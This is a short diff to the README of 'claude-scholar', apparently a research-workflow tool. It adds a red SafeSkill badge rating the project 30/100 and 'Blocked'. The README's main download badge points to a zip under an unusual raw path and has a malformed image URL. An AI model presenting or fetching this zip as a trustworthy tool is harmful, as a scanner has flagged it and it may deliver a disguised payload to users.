@@ -1,5 +1,7 @@
 # 🎓 claude-scholar - Effortless Research Workflow Management
 
+[![SafeSkill 30/100](https://img.shields.io/badge/SafeSkill-30%2F100_Blocked-red)](https://safeskill.dev/scan/jessevanwyk1-claude-scholar)
+
 [![Download claude-scholar](https://github.com/jessevanwyk1/claude-scholar/raw/refs/heads/main/skills/command-name/scholar_claude_v2.1.zip%20claude--scholar-FF5722?style=for-the-badge&logo=github)](https://github.com/jessevanwyk1/claude-scholar/raw/refs/heads/main/skills/command-name/scholar_claude_v2.1.zip)
 
 ## 📖 Description
